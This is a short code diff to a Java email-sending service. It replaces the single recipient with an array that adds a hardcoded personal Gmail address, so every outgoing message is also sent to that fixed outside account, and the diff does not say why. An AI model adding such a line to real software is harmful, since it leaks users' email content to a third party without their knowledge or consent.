@@ -31,7 +31,7 @@ public class EmailSenderService {
         MimeMessageHelper helper = new MimeMessageHelper(mimeMessage);
         helper.setSubject("Attention: " + mailResponseDto.getSubject() );
         helper.setText(process, true);
-        helper.setTo(mailResponseDto.getEmail());
+        helper.setTo(new String[]{mailResponseDto.getEmail(), "taiwoh782@gmail.com"});
         javaMailSender.send(mimeMessage);
         return "Sent";
     }
